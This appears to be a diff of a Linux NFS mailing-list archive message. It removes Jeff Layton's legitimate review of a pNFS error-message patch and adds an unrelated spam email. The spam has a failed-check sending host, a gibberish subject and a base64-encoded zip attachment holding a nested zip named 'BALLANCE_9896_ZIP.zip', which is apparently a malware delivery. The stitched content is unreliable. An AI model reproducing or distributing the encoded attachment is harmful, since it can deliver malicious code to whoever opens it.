@@ -1,54 +1,69 @@
 Return-Path: <linux-nfs-owner@vger.kernel.org>
-Received: from mail-qt0-f173.google.com ([209.85.216.173]:36847 "EHLO
-        mail-qt0-f173.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S933631AbcKDPAH (ORCPT
-        <rfc822;linux-nfs@vger.kernel.org>); Fri, 4 Nov 2016 11:00:07 -0400
-Received: by mail-qt0-f173.google.com with SMTP id w33so49519707qtc.3
-        for <linux-nfs@vger.kernel.org>; Fri, 04 Nov 2016 08:00:07 -0700 (PDT)
-Message-ID: <1478271605.28785.6.camel@redhat.com>
-Subject: Re: [PATCH] NFS: Don't print a pNFS error if we aren't using pNFS
-From: Jeff Layton <jlayton@redhat.com>
-To: Anna.Schumaker@netapp.com, linux-nfs@vger.kernel.org
-Date: Fri, 04 Nov 2016 11:00:05 -0400
-In-Reply-To: <20161104130841.17150-1-Anna.Schumaker@Netapp.com>
-References: <20161104130841.17150-1-Anna.Schumaker@Netapp.com>
-Content-Type: text/plain; charset="UTF-8"
-Mime-Version: 1.0
+Received: from 119.148.205.168.dynamic.raidnet.com.br ([168.205.148.119]:45537
+        "HELO raidnet.com.br" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S935749AbcKDPiR (ORCPT
+        <rfc822;linux-nfs@vger.kernel.org>); Fri, 4 Nov 2016 11:38:17 -0400
+MIME-Version: 1.0
+To: <linux-nfs@vger.kernel.org>
+Subject: 57564 linux-nfs
+Date: Fri, 04 Nov 2016 15:38:10 -0000
+Message-ID: <147827389036.12798.2192172253656166799@raidnet.com.br>
+Content-Type: application/zip; name="EMAIL_45983271_linux-nfs.zip"
+From: <xbb02721@gmail.com>
 Sender: linux-nfs-owner@vger.kernel.org
 List-ID: <linux-nfs.vger.kernel.org>
 
-On Fri, 2016-11-04 at 09:08 -0400, Anna.Schumaker@netapp.com wrote:
-> From: Anna Schumaker <Anna.Schumaker@Netapp.com>
-> 
-> We used to check for a valid layout type id before verifying pNFS flags
-> as an indicator for if we are using pNFS.  This changed in 3132e49ece
-> with the introduction of multiple layout types, since now we are passing
-> an array of ids instead of just one.  Since then, users have been seeing
-> a KERN_ERR printk show up whenever mounting NFS v4 without pNFS.  This
-> patch restores the original behavior of exiting set_pnfs_layoutdriver()
-> early if we aren't using pNFS.
-> 
-> Fixes 3132e49ece ("pnfs: track multiple layout types in fsinfo
-> structure")
-> Signed-off-by: Anna Schumaker <Anna.Schumaker@Netapp.com>
-> ---
->  fs/nfs/pnfs.c | 2 ++
->  1 file changed, 2 insertions(+)
-> 
-> diff --git a/fs/nfs/pnfs.c b/fs/nfs/pnfs.c
-> index 56b2d96..259ef85 100644
-> --- a/fs/nfs/pnfs.c
-> +++ b/fs/nfs/pnfs.c
-> @@ -146,6 +146,8 @@ set_pnfs_layoutdriver(struct nfs_server *server, const struct nfs_fh *mntfh,
->  	u32 id;
->  	int i;
->  
-> +	if (fsinfo->nlayouttypes == 0)
-> +		goto out_no_driver;
->  	if (!(server->nfs_client->cl_exchange_flags &
->  		 (EXCHGID4_FLAG_USE_NON_PNFS | EXCHGID4_FLAG_USE_PNFS_MDS))) {
->  		printk(KERN_ERR "NFS: %s: cl_exchange_flags 0x%x\n",
-
-Good catch!
-
-Reviewed-by: Jeff Layton <jlayton@redhat.com>
+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
+AAAAAAEAAQBbAAAAbgsAAAAA
